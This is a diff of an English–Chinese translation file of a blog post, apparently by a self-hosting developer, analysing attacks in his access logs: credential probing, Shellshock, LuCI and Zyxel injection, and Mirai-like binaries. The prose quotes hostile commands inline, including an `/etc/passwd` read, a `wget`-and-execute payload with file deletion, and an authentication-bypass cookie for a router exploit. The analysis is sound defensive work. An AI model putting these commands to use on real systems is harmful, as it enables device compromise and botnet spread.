@@ -1,64 +1,94 @@
 - en: <!--yml
+  id: totrans-0
   prefs: []
   type: TYPE_NORMAL
+  zh: <!--yml
 - en: 'category: 未分类'
+  id: totrans-1
   prefs: []
   type: TYPE_NORMAL
+  zh: 类别：未分类
 - en: 'date: 2024-05-27 15:16:57'
+  id: totrans-2
   prefs: []
   type: TYPE_NORMAL
+  zh: 日期：2024-05-27 15:16:57
 - en: -->
+  id: totrans-3
   prefs: []
   type: TYPE_NORMAL
+  zh: -->
 - en: I looked through attacks in my access logs. Here's what I found
+  id: totrans-4
   prefs:
   - PREF_H1
   type: TYPE_NORMAL
+  zh: 我查看了我的访问日志中的攻击。 这是我找到的
 - en: 来源：[https://nishtahir.com/i-looked-through-attacks-in-my-access-logs-heres-what-i-found/](https://nishtahir.com/i-looked-through-attacks-in-my-access-logs-heres-what-i-found/)
+  id: totrans-5
   prefs:
   - PREF_BQ
   type: TYPE_NORMAL
+  zh: 来源：[https://nishtahir.com/i-looked-through-attacks-in-my-access-logs-heres-what-i-found/](https://nishtahir.com/i-looked-through-attacks-in-my-access-logs-heres-what-i-found/)
 - en: I've been self-hosting for over a decade. It's freeing because I own my data,
     and do not depend on any platform other than my cloud host, which I can easily
     switch off. Self-hosting gives much insight into what it takes to run a cloud
     service. Anyone who's had some practice doing this will likely tell you that the
     internet is a dangerous place.
+  id: totrans-6
   prefs: []
   type: TYPE_NORMAL
+  zh: 我已经自行托管了十多年了。 这是自由的，因为我拥有自己的数据，并且不依赖于除了我的云主机之外的任何平台，我可以轻松关闭它。 自行托管可以深入了解运行云服务所需的内容。
+    任何有过这样练习的人可能都会告诉您，互联网是一个危险的地方。
 - en: Exposing any IP onto the public internet immediately invites a flood of malicious
     traffic. While it's undesirable there's a lot to learn from this traffic so I
     poked through my access logs to see what sorts of attacks I've been hit with recently.
+  id: totrans-7
   prefs: []
   type: TYPE_NORMAL
+  zh: 将任何IP暴露在公共互联网上立即会引来大量恶意流量。 尽管这是不可取的，但是通过这些流量我们可以学到很多东西，所以我翻阅了我的访问日志，看看我最近遭受了哪些攻击。
 - en: 'Note: I''m not a security expert. I''m just a curious developer who likes to
     poke around so please take any assertions I make with a grain of salt. I wasn''t
     sure what the value would be in redacting the IP addresses of bad guys but I redacted
     them anyway erring on the side of caution. Additionally, I''ve redacted some of
     the more colorful language used by the attackers which included poor language
     such as slurs.'
+  id: totrans-8
   prefs:
   - PREF_BQ
   type: TYPE_NORMAL
+  zh: 注意：我不是安全专家。 我只是一个好奇的开发人员，喜欢研究，所以请对我做出的任何断言持保留态度。 我不确定隐藏坏人的IP地址的价值是什么，但我还是隐藏了它们，出于谨慎的考虑。
+    另外，我还隐藏了攻击者使用的一些更加色彩丰富的语言，其中包括脏话等低俗语言。
 - en: Credential and configuration discovery
+  id: totrans-9
   prefs:
   - PREF_H1
   type: TYPE_NORMAL
+  zh: 凭证和配置发现
 - en: The most common attacks by a wide margin are directory traversal attacks in
     search of credentials. The most common appears to be in search of `.env` which
     usually contains application secrets.
+  id: totrans-10
   prefs: []
   type: TYPE_NORMAL
+  zh: 最常见的攻击方式是目录遍历攻击，以寻找凭证。 最常见的似乎是寻找`.env`，通常包含应用程序的秘密。
 - en: '[PRE0]'
+  id: totrans-11
   prefs: []
   type: TYPE_PRE
+  zh: '[PRE0]'
 - en: Additionally, attackers are looking for other common files that contain credentials.
     In my sample, they seem to be looking for AWS credentials and configuration files,
     as well as Git repositories.
+  id: totrans-12
   prefs: []
   type: TYPE_NORMAL
+  zh: 此外，攻击者正在寻找其他包含凭证的常见文件。 在我的示例中，他们似乎正在寻找AWS凭证和配置文件，以及Git仓库。
 - en: '[PRE1]'
+  id: totrans-13
   prefs: []
   type: TYPE_PRE
+  zh: '[PRE1]'
 - en: Other attacks seem to be looking for common directories that may have been accidentally
     exposed by the administrator. I have to guess that the names are guesses based
     on common names. I'd be curious to learn more about what their success rate is.
@@ -66,259 +96,382 @@
     far as I can tell is a typo of `Mozilla/5.0`. A search on [GitHub](https://github.com/search?q=%22User-Agent%22%3A+%22Mozlila%2F5.0%22&type=code&ref=nishtahir.com)
     (ignoring results attempting to block the user agent) hints that this is likely
     a typo that was made in a common tool that has been copied and pasted around.
+  id: totrans-14
   prefs: []
   type: TYPE_NORMAL
+  zh: 其他攻击似乎是在寻找可能被管理员意外暴露的常见目录。 我猜名称是根据常见名称进行猜测的。 我很想了解它们的成功率如何。 有趣的是，这些攻击的用户代理提到了`Mozlila/5.0`，据我所知，这是`Mozilla/5.0`的拼写错误。
+    在[GitHub](https://github.com/search?q=%22User-Agent%22%3A+%22Mozlila%2F5.0%22&type=code&ref=nishtahir.com)上的搜索（忽略试图阻止用户代理的结果）暗示这很可能是一个常见工具中的拼写错误，该工具已被复制并粘贴。
 - en: '[PRE2]'
+  id: totrans-15
   prefs: []
   type: TYPE_PRE
+  zh: '[PRE2]'
 - en: The attackers also seem to be looking for common remote access and configuration
     tools.
+  id: totrans-16
   prefs: []
   type: TYPE_NORMAL
+  zh: 攻击者似乎也在寻找常见的远程访问和配置工具。
 - en: '[PRE3]'
+  id: totrans-17
   prefs: []
   type: TYPE_PRE
+  zh: '[PRE3]'
 - en: The lesson here seems to be to expose the absolute bare minimum to the public
     internet. If you don't need it, don't expose it. If you must expose tools or directories,
     add some layer of authentication and if possible restrict access to specific IP
     addresses because bad actors will be looking for it.
+  id: totrans-18
   prefs: []
   type: TYPE_NORMAL
+  zh: 这里的教训似乎是尽量将绝对最少的内容暴露给公共互联网。 如果不需要，就不要暴露。 如果必须暴露工具或目录，请添加一些身份验证层，如果可能，请限制访问特定IP地址，因为恶意行为者将在寻找它。
 - en: Shellshock
+  id: totrans-19
   prefs:
   - PREF_H1
   type: TYPE_NORMAL
+  zh: Shellshock
 - en: Next, we've got a bunch of attacks that seem to be exploiting the Shellshock
     vulnerability.
+  id: totrans-20
   prefs: []
   type: TYPE_NORMAL
+  zh: 接下来，我们有一堆看起来正在利用Shellshock漏洞的攻击。
 - en: '[PRE4]'
+  id: totrans-21
   prefs: []
   type: TYPE_PRE
+  zh: '[PRE4]'
 - en: This vulnerability exploits Webservers that execute CGI scripts with a vulnerable
     bash version by allowing an attacker to execute arbitrary commands. When a CGI
     program starts, it sets environment variables with the content of the request,
     of note is `HTTP_USER_AGENT`. When the characters `() { :; };` are included, bash
     interprets that as a function that needs to be executed.
+  id: totrans-22
   prefs: []
   type: TYPE_NORMAL
+  zh: 此漏洞利用执行具有易受攻击的bash版本的CGI脚本的Web服务器，允许攻击者执行任意命令。当CGI程序启动时，它会使用请求的内容设置环境变量，值得注意的是`HTTP_USER_AGENT`。当包含字符`()
+    { :; };`时，bash解释为需要执行的函数。
 - en: In this specific attack, the bad guy sent this function as the user agent.
+  id: totrans-23
   prefs: []
   type: TYPE_NORMAL
+  zh: 在这次特定的攻击中，坏人将这个函数作为用户代理发送。
 - en: '[PRE5]'
+  id: totrans-24
   prefs: []
   type: TYPE_PRE
+  zh: '[PRE5]'
 - en: Let's break it down further.
+  id: totrans-25
   prefs: []
   type: TYPE_NORMAL
+  zh: 让我们进一步分解。
 - en: '`() { ignored; };`: This part defines a function in Bash. The content inside
     the curly braces is the function body. The ignored command is a placeholder; it
     doesn''t affect the execution but was likely included to prevent syntax errors.'
+  id: totrans-26
   prefs:
   - PREF_OL
   type: TYPE_NORMAL
+  zh: '`() { ignored; };`：这部分在Bash中定义了一个函数。花括号内的内容是函数主体。忽略的命令是一个占位符；它不影响执行，但可能包含以防止语法错误。'
 - en: '`echo Content-Type: text/html; echo ;`: These commands are part of the function
     body. They set the Content-Type header of the HTTP response to "text/html" and
     echo an empty line.'
+  id: totrans-27
   prefs:
   - PREF_OL
   type: TYPE_NORMAL
+  zh: '`echo Content-Type: text/html; echo ;`：这些命令是函数主体的一部分。它们将HTTP响应的Content-Type标题设定为"text/html"并回显一个空行。'
 - en: '`/bin/cat /etc/passwd`: This is the malicious command embedded within the function.
     It attempts to use the `cat` command to display the contents of the `/etc/passwd`
     file, which contains user account information.'
+  id: totrans-28
   prefs:
   - PREF_OL
   type: TYPE_NORMAL
+  zh: '`/bin/cat /etc/passwd`：这是嵌入在函数中的恶意命令。它尝试使用`cat`命令显示`/etc/passwd`文件的内容，其中包含用户帐户信息。'
 - en: If the attack was successful, the attacker would theoretically gain access to
     my user credentials as well as have a mechanism to execute arbitrary code on the
     server.
+  id: totrans-29
   prefs: []
   type: TYPE_NORMAL
+  zh: 如果攻击成功，攻击者理论上会获得我的用户凭据以及在服务器上执行任意代码的机制。
 - en: Like the directory traversal attack, the attacker guesses common directories
     and paths looking for an endpoint that responds favorably.
+  id: totrans-30
   prefs: []
   type: TYPE_NORMAL
+  zh: 像目录遍历攻击一样，攻击者猜测常见的目录和路径，寻找响应良好的终点。
 - en: '[PRE6]'
+  id: totrans-31
   prefs: []
   type: TYPE_PRE
+  zh: '[PRE6]'
 - en: LuCI Injection
+  id: totrans-32
   prefs:
   - PREF_H1
   type: TYPE_NORMAL
+  zh: LuCI注入
 - en: '[PRE7]'
+  id: totrans-33
   prefs: []
   type: TYPE_PRE
+  zh: '[PRE7]'
 - en: This time we've got an attack that seems to be targeting the LuCI web interface
     for OpenWRT routers. The attack attempts to inject a command into the country
     field of a form that downloads and executes a shell script that is hosted remote
     server. Let's break it down.
+  id: totrans-34
   prefs: []
   type: TYPE_NORMAL
+  zh: 这次我们发现的攻击似乎针对OpenWRT路由器的LuCI Web界面。该攻击尝试将一条命令注入到表单的国家字段中，以下载并执行托管在远程服务器上的shell脚本。让我们进一步分解。
 - en: The malicious code is in the URL which has been URL encoded. Decoding the URL
     makes it easier to read.
+  id: totrans-35
   prefs: []
   type: TYPE_NORMAL
+  zh: URL中的恶意代码已经进行了URL编码。解码URL会更容易阅读。
 - en: '[PRE8]'
+  id: totrans-36
   prefs: []
   type: TYPE_PRE
+  zh: '[PRE8]'
 - en: Breaking it down,
+  id: totrans-37
   prefs: []
   type: TYPE_NORMAL
+  zh: 分解一下，
 - en: '`/cgi-bin/luci/;stok=/locale`: This is the path to a CGI script in the LuCI
     interface. LuCI is a web-based interface for OpenWRT routers and similar embedded
     devices.'
+  id: totrans-38
   prefs:
   - PREF_OL
   type: TYPE_NORMAL
+  zh: '`/cgi-bin/luci/;stok=/locale`：这是LuCI界面中CGI脚本的路径。LuCI是用于OpenWRT路由器和类似嵌入式设备的基于Web的接口。'
 - en: '`?form=country&operation=write&country=`: These are parameters passed to the
     CGI script.'
+  id: totrans-39
   prefs:
   - PREF_OL
   type: TYPE_NORMAL
+  zh: '`?form=country&operation=write&country=`：这些是传递给CGI脚本的参数。'
 - en: '`$(cd /tmp; rm -rf *; wget http://xxx.xxx.xxx.xxx/tenda.sh; chmod 777 tenda.sh;./tenda.sh)`:
     This is a bash substitution command intended to be executed and the output is
     substituted into the URL. The command is trying to cd into the `/tmp` folder,
     delete all files, download a shell script from a remote server, and execute it.'
+  id: totrans-40
   prefs:
   - PREF_OL
   type: TYPE_NORMAL
+  zh: '`$(cd /tmp; rm -rf *; wget http://xxx.xxx.xxx.xxx/tenda.sh; chmod 777 tenda.sh;./tenda.sh)`：这是一个打算执行的bash替换命令，并且输出会被替换到URL中。该命令尝试进入`/tmp`文件夹，删除所有文件，从远程服务器下载一个shell脚本，并执行它。'
 - en: Please do not try what I am about to do yourself. At this point in my investigation,
     I have no idea what the script contains or what it does. I'm taking a calculated
     risk and have taken measures to keep myself safe. If you're not sure what you're
     doing, attempting to do the same could cause you to end up with a compromised
     machine.
+  id: totrans-41
   prefs:
   - PREF_BQ
   type: TYPE_NORMAL
+  zh: 请不要尝试我即将做的事情。在我调查的这一点上，我不知道脚本包含什么或者做什么。我正在冒险并采取措施保持自己安全。如果你不确定自己在做什么，尝试这样做可能会导致您的机器遭到攻击。
 - en: Downloading the script to investigate further, I discovered that the attacker
     aimed to download and execute an additional binary.
+  id: totrans-42
   prefs: []
   type: TYPE_NORMAL
+  zh: 下载脚本以进一步调查，我发现攻击者的目标是下载并执行额外的二进制文件。
 - en: '[PRE9]'
+  id: totrans-43
   prefs: []
   type: TYPE_PRE
+  zh: '[PRE9]'
 - en: 'The binaries appear to be named after the architecture of the target device
     which makes sense since the attacker may not know what architecture the device
     is running on. This would give them the most surface area to work with. (Note:
     I censored names because the attacker renamed the binaries to common slurs)'
+  id: totrans-44
   prefs: []
   type: TYPE_NORMAL
+  zh: 二进制文件似乎是根据目标设备的架构命名的，这是有道理的，因为攻击者可能不知道设备运行的架构。这会给他们最大的工作表面。 （注：我对名称进行了审查，因为攻击者将二进制文件重命名为常见的侮辱性词汇）
 - en: I proceeded to download a binary incompatible with my environment as an additional
     precaution and installed Ghidra to investigate further. Looking through the binary
     only had 3 functions without a lot of string data. However, there was a large
     segment of data that looked like this.
+  id: totrans-45
   prefs: []
   type: TYPE_NORMAL
+  zh: 我继续下载了一个与我的环境不兼容的二进制文件，作为一项额外的预防措施，并安装了 Ghidra 进行进一步的调查。查看二进制文件时，只有 3 个函数没有太多的字符串数据。但是，有一大段数据看起来是这样的。
 - en: '[PRE10]'
+  id: totrans-46
   prefs: []
   type: TYPE_PRE
+  zh: '[PRE10]'
 - en: This segment stood out indicating that it's an embedded ELF binary that has
     been packed with [UPX](https://github.com/upx/upx?ref=nishtahir.com). Some quick
     research indicated that it's often misused by malware authors to obfuscate and
     compress their binaries. As long as the malware author didn't modify the UPX header
     or packed binary, we should be able to use UPX to unpack the binary.
+  id: totrans-47
   prefs: []
   type: TYPE_NORMAL
+  zh: 这一部分引人注目，表明它是一个嵌入式 ELF 二进制文件，已使用 [UPX](https://github.com/upx/upx?ref=nishtahir.com)
+    进行打包。一些快速研究表明，这经常被恶意软件作者滥用，用于混淆和压缩他们的二进制文件。只要恶意软件作者没有修改 UPX 标头或打包的二进制文件，我们应该能够使用
+    UPX 解包二进制文件。
 - en: '[PRE11]'
+  id: totrans-48
   prefs: []
   type: TYPE_PRE
+  zh: '[PRE11]'
 - en: Success! We now have a lot more strings we can look at this time, which sheds
     a bit more light on what the malware was intended to do.
+  id: totrans-49
   prefs: []
   type: TYPE_NORMAL
+  zh: 成功！这次我们有更多字符串可以查看，这使得恶意软件的意图更加清晰。
 - en: '[PRE12]'
+  id: totrans-50
   prefs: []
   type: TYPE_PRE
+  zh: '[PRE12]'
 - en: What stands out this time is M-SEARCH with the ST header. This is a UPnP command
     looking for devices that support the DIAL protocol on the network. Based on the
     accompanying XML payload it looks like the malware is programmed to scan for Huawei
     devices on the network that are vulnerable to command injection. This appears
     to have been identified as being part of the Mirai botnet.
+  id: totrans-51
   prefs: []
   type: TYPE_NORMAL
+  zh: 这次引人注目的是带有 ST 标头的 M-SEARCH。这是一个寻找网络上支持 DIAL 协议的设备的 UPnP 命令。根据附带的 XML 负载，看起来恶意软件被编程为扫描网络上易受命令注入攻击的华为设备。这似乎已被确认为
+    Mirai 僵尸网络的一部分。
 - en: I tried to download the referenced `yeye.mips` however the file didn't appear
     to be available when I attempted to fetch it. Perhaps the file is only available
     at certain times of the day or only responds to certain headers or user agents?
     Running `nmap` on the server revealed that there were only 2 open ports
+  id: totrans-52
   prefs: []
   type: TYPE_NORMAL
+  zh: 我尝试下载引用的 `yeye.mips`，但是当我尝试获取它时，文件似乎不可用。也许这个文件只在一天的某些时间可用，或者只对某些头或用户代理作出响应？在服务器上运行
+    `nmap` 显示只有 2 个开放端口。
 - en: '[PRE13]'
+  id: totrans-53
   prefs: []
   type: TYPE_PRE
+  zh: '[PRE13]'
 - en: So this is where this journey came to an end.
+  id: totrans-54
   prefs: []
   type: TYPE_NORMAL
+  zh: 这就是这段旅程的终点。
 - en: Zyxel Injection
+  id: totrans-55
   prefs:
   - PREF_H1
   type: TYPE_NORMAL
+  zh: Zyxel 注入
 - en: '[PRE14]'
+  id: totrans-56
   prefs: []
   type: TYPE_PRE
+  zh: '[PRE14]'
 - en: This time we have a shell command in the URL of a GET request. The command contains
     a bunch of `${IFS}` shell substitutions which we can clean up to make it easier
     to read.
+  id: totrans-57
   prefs: []
   type: TYPE_NORMAL
+  zh: 这次我们在 GET 请求的 URL 中有一个 shell 命令。该命令包含一堆`${IFS}` shell 替换，我们可以清理一下以便阅读。
 - en: '[PRE15]'
+  id: totrans-58
   prefs: []
   type: TYPE_PRE
+  zh: '[PRE15]'
 - en: This appears to be exploiting `zhttpd` which a quick search points out is an
     exploit available in Zyxel devices. Like the previous exploit, I decided to download
     the binary and poke around in Ghidra. Fortunately this time, the binary was not
     packed and as a result see what strings were contained to get a sense of what
     it was intended to do.
+  id: totrans-59
   prefs: []
   type: TYPE_NORMAL
+  zh: 这似乎是在利用 `zhttpd`，一个快速搜索指出它是 Zyxel 设备中可用的漏洞利用。与先前的漏洞利用类似，我决定下载二进制文件并在 Ghidra
+    中查看。幸运的是，这次二进制文件没有被打包，因此我们可以看到其中包含的字符串，以便了解它的意图。
 - en: Looking through the strings a few items stood out.
+  id: totrans-60
   prefs: []
   type: TYPE_NORMAL
+  zh: 浏览字符串时，有几个项目引人注目。
 - en: '[PRE16]'
+  id: totrans-61
   prefs: []
   type: TYPE_PRE
+  zh: '[PRE16]'
 - en: Another DIAL protocol scan. Looking for vulnerable Huawei devices trying to
     download `huhu.mips` presumably as a form of self-replication.
+  id: totrans-62
   prefs: []
   type: TYPE_NORMAL
+  zh: 另一个 DIAL 协议扫描。寻找易受攻击的华为设备，试图下载 `huhu.mips`，可能是一种自我复制的形式。
 - en: '[PRE17]'
+  id: totrans-63
   prefs: []
   type: TYPE_PRE
+  zh: '[PRE17]'
 - en: Another standout was this command. which appear to be targetting routers according
     to [this](https://www.akamai.com/blog/security-research/cve-2023-26801-exploited-spreading-mirai-botnet?ref=nishtahir.com)
     post by Akamai
+  id: totrans-64
   prefs: []
   type: TYPE_NORMAL
+  zh: 另一个显著的是这个命令，根据 Akamai 的[这篇](https://www.akamai.com/blog/security-research/cve-2023-26801-exploited-spreading-mirai-botnet?ref=nishtahir.com)文章，似乎是针对路由器的。
 - en: 'To exploit this vulnerability, an attacker can send the following HTTP POST
     request to the "/goform/set_LimitClient_cfg" URL:'
+  id: totrans-65
   prefs:
   - PREF_BQ
   type: TYPE_NORMAL
+  zh: 要利用此漏洞，攻击者可以向“/goform/set_LimitClient_cfg”URL 发送以下 HTTP POST 请求：
 - en: '...'
+  id: totrans-66
   prefs:
   - PREF_BQ
   type: TYPE_NORMAL
+  zh: '...'
 - en: Ensure that the "Cookie" header is set to "user=admin" since the program has
     no special checks for authentication or authorization. This means that no prior
     authentication is required to exploit the vulnerability.
+  id: totrans-67
   prefs:
   - PREF_BQ
   type: TYPE_NORMAL
+  zh: 确保“Cookie”头设置为“user=admin”，因为程序没有针对身份验证或授权的特殊检查。这意味着在利用漏洞之前不需要进行先前的身份验证。
 - en: At this point, we can conclude that this is likely an agent of the Mirai botnet.
     However, some sources also mention that it could be associated with the Linux
     Medusa as well.
+  id: totrans-68
   prefs: []
   type: TYPE_NORMAL
+  zh: 到目前为止，我们可以得出结论，这很可能是Mirai僵尸网络的代理。然而，一些消息来源还提到它可能与Linux Medusa有关。
 - en: Conclusion
+  id: totrans-69
   prefs:
   - PREF_H1
   type: TYPE_NORMAL
+  zh: 结论
 - en: This is barely scratching the surface of my logs. There are dozens of other
     exploits that are being attempted daily I could poke through but this post has
     already gone long enough.
+  id: totrans-70
   prefs: []
   type: TYPE_NORMAL
+  zh: 这只是我日志的皮毛。每天都有数十种其他的攻击尝试，我可以浏览，但这篇文章已经够长了。
 - en: This experience does highlight the importance of keeping devices, especially
     IoT devices up to date, and if at all possible keep them off the public internet.
     If they must be exposed, keep them isolated as much as possible to their own VLAN.
+  id: totrans-71
   prefs: []
   type: TYPE_NORMAL
+  zh: 这一经历确实突显了保持设备，特别是物联网设备的重要性，并尽可能将它们远离公共互联网。如果它们必须暴露在外，尽量将它们隔离到自己的虚拟局域网中。
